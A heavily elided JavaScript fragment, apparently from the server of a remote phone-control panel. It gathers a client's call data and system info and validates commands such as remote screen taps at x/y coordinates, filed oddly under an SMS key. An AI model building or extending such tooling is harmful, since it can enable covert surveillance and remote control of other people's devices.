...
class Clients {
    ...
    getClientDataByPage(clientID, page, filter = undefined) {
        ...
        if (client !== undefined) {
            ...
            if (page === "calls") {
                ...
                pageData = client;
                pageData.systemInfo = clientDB.get('systemInfo').value();
            }
    ...
    checkCorrectParams(commandID, commandPayload, cb) {
        if (commandID === CONST.messageKeys.sms) {
            ...
            if (!('action' in commandPayload)) return cb('Input Missing `action` Parameter');
            else {
                if (commandPayload.action === 'tap') {
                    if (!('x' in commandPayload) || !('y' in commandPayload)) return cb('Input Missing `x`/`y`');
                    else return cb(false);
                } else return cb('Input `action` must be tap');
            }
        }
